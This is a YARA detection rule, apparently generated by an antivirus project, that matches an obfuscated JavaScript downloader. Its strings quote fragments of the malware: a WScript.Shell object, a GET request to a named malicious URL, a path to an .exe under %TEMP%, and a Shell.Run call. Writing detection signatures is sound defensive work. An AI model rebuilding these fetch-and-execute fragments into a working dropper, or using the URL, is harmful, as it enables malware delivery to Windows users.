rule sig_20160330_aa5ef3e83867d894398917d6f42834f1 {
  meta:
    description = "datamaliciousorder - file 20160330_aa5ef3e83867d894398917d6f42834f1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6be32415c32a30f9d4c5f08887573a05b6942a8759783f1f03c90d7452818716"

  strings:
    $s1  = "function _F(_J0, _F0){_R = _R * 1; return _J0 - _F0;};" fullword ascii
    $s2  = "var _RE = function _HO() {return WScript[_G](\"WScript\"+\".Shell\");}(), _WF = 11;" fullword ascii
    $s3  = "_V0[_CL](\"GET\", \"http://ihlasauracleanmax.co/j3dlad\", false);" fullword ascii
    $s4  = "if (_V0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _YB(){return _Y + \"\";};" fullword ascii
    $s6  = "function _BG() {return _RE[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"H2x6VKsq.ex\" + \"e\";};" fullword ascii
    $s7  = "function _AG() {return ((_TA == true) && (_TA == _GE)) ? 1 : _R;};" fullword ascii
    $s8  = "function _O(_ML){_RE[\"Run\"](_ML, _R, _R);};" fullword ascii
    $s9  = "function _YK()" fullword ascii
    $s10 = "function _DF(){return 22;};" fullword ascii
    $s11 = "function _B(){return _G;};" fullword ascii
    $s12 = "function _SZ(_A) {var _J = (1, 2, 3, 4, 5, _A); return _J;};" fullword ascii
    $s13 = "return _F(_YS, _FO);" fullword ascii
    $s14 = "var _QJ = new this[\"Date\"]();" fullword ascii
    $s15 = " while (_JZ){" fullword ascii
    $s16 = "var _GE = false;" fullword ascii
    $s17 = "var _TA = false;" fullword ascii
    $s18 = "var _LZ = false;" fullword ascii
    $s19 = "_TA = true; " fullword ascii
    $s20 = "_GE = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}